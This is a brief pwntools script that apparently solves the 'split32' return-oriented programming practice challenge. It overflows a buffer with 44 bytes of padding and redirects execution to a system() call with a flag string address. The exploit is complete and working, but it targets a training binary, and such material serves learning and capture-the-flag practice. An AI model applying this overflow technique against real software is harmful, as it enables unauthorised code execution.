from pwn import *

context.binary = elf = ELF('./split32')

offset = 44

call_system = 0x804861a
flag_string = 0x804a030

payload = b'c'*offset+p32(call_system)+p32(flag_string) 

p = elf.process()
p.recv()
p.sendline(payload)
log.info(p.recvall())

